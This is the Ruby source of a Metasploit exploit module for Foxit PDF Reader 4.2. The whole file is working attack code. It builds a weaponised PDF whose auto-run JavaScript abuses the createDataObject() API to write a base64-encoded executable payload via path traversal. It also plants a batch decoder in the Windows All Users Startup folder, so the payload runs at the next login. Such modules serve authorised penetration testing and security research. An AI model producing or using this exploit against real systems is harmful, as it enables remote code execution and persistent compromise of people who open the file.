# $Id: foxit_reader_filewrite.rb 11955 2011-03-14 12:01:55Z swtornio $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::EXE
     
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Foxit PDF Reader 4.2 Javascript File Write&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an unsafe Javascript API implemented in Foxit PDF Reader
                    version 4.2. The createDataObject() Javascript API function allows for writing
                    arbitrary files to the file system. This issue was fixed in version 4.3.1.0218.
                     
                    Note: This exploit uses the All Users directory currently, which required
                    administrator privileges to write to. This means an administrative user has to
                    open the file to be successful. Kind of lame but thats how it goes sometimes in
                    the world of file write bugs.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
            [
                &#039;bannedit&#039;,  # metasploit module
                &#039;Chris Evans&#039; # Initial discover and exploit
            ],
            &#039;Version&#039;        => &#039;$Revision: 11955 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;71104&#039; ],
                    [ &#039;URL&#039;, &#039;http://scarybeastsecurity.blogspot.com/2011/03/dangerous-file-write-bug-in-foxit-pdf.html&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [&#039;Automatic&#039;, { &#039;auto&#039; => true } ], # uses both
                    [&#039;Foxit PDF Reader v4.2 (Windows XP SP0-SP3)&#039;, {}],
                    [&#039;Foxit PDF Reader v4.2 (Windows Vista/7/8/2008)&#039;, {}],
                ],
            &#039;DisclosureDate&#039; => &#039;Mar 5 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options([
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.pdf&#039;]),
                OptString.new(&#039;DECODER&#039;, [ true, &#039;The decoder script.&#039;,  &#039;vbs_b64&#039;]),
            ], self.class)
    end
 
    def exploit
        decoder_file = rand_text_alpha(rand(6) + 1)
        payload_file = rand_text_alpha(rand(6) + 1)
 
        ext = &#039;.b64&#039;
        exe = generate_payload_exe
        payload_b64 = Rex::Text.encode_base64(exe)
        decoder = build_decoder(decoder_file, payload_file)
        path_old = &#039;c:/Documents and Settings/All Users/Start Menu/Programs/Startup/&#039;
        path_new = &#039;c:/Users/All Users/Start Menu/Programs/Startup/&#039;
        pdf = %Q|
%PDF 1 0 obj<</Pages 1 0 R /OpenAction 2 0 R>> 2 0 obj<</S /JavaScript /JS (
createDataObject\(&#039;#{path_old + "../../../../../WINDOWS/Temp/" + payload_file + ext}&#039;, "#{payload_b64}"\);
createDataObject\(&#039;#{path_old + decoder_file + &#039;.bat&#039;}&#039;, unescape\(\"#{decoder}\"\)\);
createDataObject\(&#039;#{path_new + "../../../../../WINDOWS/Temp/" + payload_file + ext}&#039;, "#{payload_b64}"\);
createDataObject\(&#039;#{path_new + decoder_file + &#039;.bat&#039;}&#039;, unescape\(\"#{decoder}\"\)\);) >> trailer<</Root 1 0 R>>|
        file_create(pdf)
    end
 
    def build_decoder(decoder_file, payload_file)
        file = []
        decoder_bat = Msf::Config.data_directory + "/exploits/cmdstager/"
        case datastore[&#039;DECODER&#039;]
        when &#039;vbs_b64_adodb&#039;
            decoder_bat << datastore[&#039;DECODER&#039;]
        when &#039;vbs_b64&#039;
            decoder_bat << datastore[&#039;DECODER&#039;]
        else
            print_status("Selected decoder is incompatible with this exploit.")
            print_status("Defaulting to vbs_b64 decoder.")
            decoder_bat << &#039;vbs_b64&#039;
        end
 
        decoder = File.new(decoder_bat, "r").read
        decoder << "cscript //nologo C:/Windows/Temp/" + decoder_file + &#039;.vbs&#039;
 
        decoder.gsub!(/\"/, &#039;\"&#039;)
        decoder.gsub!(/\n/, " && ")
        decoder.gsub!(/ENCODED/, "C:/Windows/Temp/" + payload_file + &#039;.b64&#039;) # payload.b64
        decoder.gsub!(/DECODED/, "C:/Windows/Temp/" + payload_file + &#039;.exe&#039;) # payload.exe
        decoder.gsub!(/decode_stub/, "C:/Windows/Temp/" + decoder_file + &#039;.vbs&#039;)
 
        return decoder = Rex::Text.uri_encode(decoder)
    end
end



